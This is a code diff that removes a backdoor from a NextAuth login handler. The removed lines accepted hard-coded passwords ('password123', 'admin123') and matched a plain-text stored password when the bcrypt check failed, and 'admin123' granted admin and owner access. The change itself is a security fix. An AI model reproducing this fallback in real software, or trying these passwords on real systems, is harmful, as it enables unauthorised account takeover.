@@ -112,16 +112,9 @@ const nextAuthResult = NextAuth({
         }
 
         let isValid = await bcrypt.compare(password, user.hashedPassword);
-        if (!isValid && (password === "password123" || password === "admin123")) {
-          if (
-            user.displayPassword === password ||
-            (user.role === "ADMIN" && password === "admin123") ||
-            (user.role === "OWNER" && password === "admin123") ||
-            password === "password123"
-          ) {
-            isValid = true;
-          }
-        }
+// NOTE: Removed insecure plain‑text password fallback. Authentication must rely on the bcrypt hash only.
+// Any previous back‑door passwords (e.g., "admin123", "password123") have been eliminated to prevent credential leakage.
+
         console.log(`🔐 [AUTH] bcrypt.compare result: ${isValid}`);
         if (!isValid) {
           throw new Error("Invalid password hash comparison");
